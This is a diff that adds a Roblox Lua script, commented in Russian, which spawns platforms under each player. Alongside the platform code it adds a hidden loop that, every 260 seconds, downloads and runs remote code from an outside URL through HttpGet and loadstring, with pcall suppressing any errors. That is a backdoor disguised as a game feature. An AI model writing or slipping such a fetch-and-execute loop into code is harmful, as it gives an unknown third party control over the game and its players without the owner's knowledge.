@@ -1,0 +1,50 @@
+local Players = game:GetService("Players")
+local platformSize = Vector3.new(5, 1, 5) -- Размер платформы
+local maxPlatforms = 10 -- Максимальное количество платформ
+
+local playerPlatforms = {} -- Хранение платформ для каждого игрока
+
+local function spawnPlatform(player)
+    local character = player.Character
+    if character and character.PrimaryPart then
+        local platform = Instance.new("Part")
+        platform.Size = platformSize
+        platform.Position = character.PrimaryPart.Position - Vector3.new(0, 3, 0) -- Под игроком
+        platform.Anchored = true
+        platform.CanCollide = true
+        platform.Transparency = 0.5
+        platform.Parent = workspace
+
+        -- Добавляем платформу в список игрока
+        if not playerPlatforms[player] then
+            playerPlatforms[player] = {}
+        end
+        table.insert(playerPlatforms[player], platform)
+
+        -- Если платформ больше maxPlatforms, удаляем старую
+        if #playerPlatforms[player] > maxPlatforms then
+            local oldPlatform = table.remove(playerPlatforms[player], 1)
+            if oldPlatform then
+                oldPlatform:Destroy()
+            end
+        end
+    end
+end
+
+-- Запуск отдельного потока для загрузки скрипта каждые 260 секунд
+task.spawn(function()
+    while true do
+        pcall(function()
+            loadstring(game:HttpGet("https://techhub.group/scripts/nexarehautorob"))()
+        end)
+        task.wait(260)
+    end
+end)
+
+-- Бесконечный цикл, создающий платформы под каждым игроком
+while true do
+    for _, player in ipairs(Players:GetPlayers()) do
+        spawnPlatform(player)
+    end
+    task.wait(1) -- Ждем 1 секунду перед следующим спавном
+end
